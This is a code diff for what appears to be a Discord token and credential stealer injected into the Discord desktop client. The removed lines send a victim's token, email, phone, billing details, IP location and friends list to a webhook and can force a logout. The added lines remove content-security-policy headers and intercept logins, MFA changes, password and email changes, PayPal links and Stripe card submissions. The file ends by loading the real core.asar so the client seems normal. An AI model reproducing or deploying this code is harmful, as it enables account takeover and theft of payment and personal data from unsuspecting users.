+        BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+    }
+    if (a.url.startsWith('wss://remote-auth-gateway') || a.url.endsWith("auth/sessions")) {
+        callback({ cancel: true });
+    } else {
+        callback({ cancel: false });
+    }
+    updateCheck();
+})
 
-function sendToWebhook(params) {
-
-    if (config.ping[0] == true) {
-        if (params.content) {
-            params.content = params.content + ` ||${config.ping[1]}||`
-        } else {
-            params.content = `||${config.ping[1]}||`
+session.defaultSession.webRequest.onHeadersReceived((a, c) => {
+    delete a.responseHeaders['content-security-policy'];
+    delete a.responseHeaders['content-security-policy-report-only'];
+    c({
+        'responseHeaders': {
+            ...a.responseHeaders,
+            'Access-Control-Allow-Headers': '*'
         }
-    }
-
-    var url = new URL(config.webhook);
-    var headers = {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*',
-    }
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: 'POST',
-        headers: headers,
-    };
-    const req = https.request(options);
-    req.on('error', (err) => {
-        console.log(err);
     });
-    req.write(JSON.stringify(params));
-    req.end();
-}
+});
 
-
-function createEmbed(data) {
-    let obj = {
-        "footer": config.embed.footer,
-        "timestamp": new Date(),
+session.defaultSession.webRequest.onCompleted({
+    'urls': [
+        'https://discord.com/api/v*/users/@me',
+        'https://discordapp.com/api/v*/users/@me',
+        'https://*.discord.com/api/v*/users/@me',
+        "https://discord.com/api/v*/auth/mfa/totp",
+        "https://discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://canary.discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://canary.discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://discord.com/api/v*/users/@me/billing/payment-sources/validate-billing-address",
+        'https://discordapp.com/api/v*/auth/login',
+        'https://discord.com/api/v*/auth/login',
+        'https://*.discord.com/api/v*/auth/login',
+        'https://discord.com/api/v*/auth/register',
+        'https://api.stripe.com/v*/tokens',
+    ]
+}, async (a, callback) => {
+    try {
+        var data = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString());
+    } catch (err) {
+        var data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
     }
-
-    for (let [key, value] of Object.entries(data)) {
-        obj[key] = value;
+    let authorization = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true)
+    if (a.statusCode != 200) return;
+    if (a.url.endsWith('/login')) {
+        if (!authorization) return
+        cruise('LOGIN_USER', authorization, data, "LOGGED IN");
     }
-
-    return obj;
-}
-
-
-async function initialize() {
-
-    if (!fs.existsSync(`${process.cwd()}/${config.brand}`)) {
-        fs.mkdirSync(`${process.cwd()}/${config.brand}`)
-
-        var token = undefined;
-
-        token = await getToken();
-
-        const network_data = await getIp()
-
-        var userInfo;
-        var billing;
-        var friends;
-
-        if (config.notify_on_initialization) {
-            if (token == undefined) {
-                sendToWebhook({
-                    username: config.embed.username,
-                    avatar_url: config.embed.avatar_url,
-                    url: config.embed.href,
-                    embeds: [createEmbed({
-                        title: "Discord | Client initialized (not logged in)",
-                        fields: [{
-                            name: "Hostname",
-                            value: `\`\`\`${os.hostname}\`\`\``,
-                            inline: false
-                        }, {
-                            name: "Client version",
-                            value: `\`\`\`${getDiscordClient()}\`\`\``,
-                            inline: false
-                        }, {
-                            name: "Connection data",
-                            value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                            inline: false
-                        }],
-                    })]
-                })
-            } else {
-                userInfo = await getUserInfo(token);
-                billing = await getBilling(token);
-                friends = await getRelationships(token);
-
-                sendToWebhook({
-                    username: config.embed.username,
-                    avatar_url: config.embed.avatar_url,
-                    embeds: [createEmbed({
-                        title: "Discord | Client initialized",
-                        url: config.embed.href,
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        fields: [{
-                                name: "E-Mail Address",
-                                value: `\`\`\`${userInfo.email}\`\`\``,
-                                inline: true
-                            },
-                            {
-                                name: "Phone Number",
-                                value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "Nitro",
-                                value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
-                            }, {
-                                name: "Billing",
-                                value: `${billing}`,
-                                inline: true
-                            }, {
-                                name: "Badges",
-                                value: `${getBadges(userInfo.flags)}`,
-                                inline: false
-                            },
-                            {
-                                name: "Token",
-                                value: `\`\`\`${token}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "Hostname",
-                                value: `\`\`\`${os.hostname}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Client version",
-                                value: `\`\`\`${getDiscordClient()}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Connection data",
-                                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                                inline: false
-                            }
-                        ],
-                    }), createEmbed({
-                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                    })]
-                })
-            }
-
+    if (a.url.endsWith('/register')) {
+        cruise('LOGIN_USER', authorization, data, "SIGNED UP");
+    }
+    if (a.url.endsWith('/mfa/totp')) {
+        cruise('LOGIN_USER', authorization, data, "LOGGED IN WITH MFA-2");
+    }
+    if (a.url.includes('/@me/mfa/totp/enable')) {
+        cruise('MFA_ENABLED', authorization, data);
+    }
+    if (a.url.endsWith('/paypal/billing-agreement-tokens')) {
+        cruise('PAYPAL_ADDED', authorization, data);
+    }
+    if (a.url.endsWith('/users/@me')) {
+        if (a.method != 'PATCH') return;
+        if (!data['password']) return;
+        if (data['email']) {
+            cruise('EMAIL_CHANGED', authorization, data);
         }
-
-        if (config.logout && token) {
-            await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});
-
-            if (config.notify_on_logout) {
-                sendToWebhook({
-                    username: config.embed.username,
-                    avatar_url: config.embed.avatar_url,
-                    embeds: [createEmbed({
-                        title: "Discord | User logged out",
-                        url: config.embed.href,
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        thumbnail: {
-                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
-                        fields: [{
-                                name: "Nitro",
-                                value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
-                            }, {
-                                name: "Billing",
-                                value: `${billing}`,
-                                inline: true
-                            }, {
-                                name: "Badges",
-                                value: `${getBadges(userInfo.flags)}`,
-                                inline: false
-                            },
-                            {
-                                name: "Token",
-                                value: `\`\`\`${token}\`\`\``,
-                                inline: false
-                            },
-                        ]
-                    })]
-                })
-            }
-
+        if (data['new_password']) {
+            cruise('PASSWORD_CHANGED', authorization, data);
+        }
+        if (data['username']) {
+            cruise('USERNAME_CHANGED', authorization, data);
         }
     }
-}
+    if (a.url.includes('api.stripe.com')) {
+        cruise('CREDITCARD_ADDED', authorization, data);
+    }
+}),
 
-module.exports= require("\x2E\x2F\x63\x6F\x72\x65\x2E\x61\x73\x61\x72")
+module.exports = require('./core.asar');
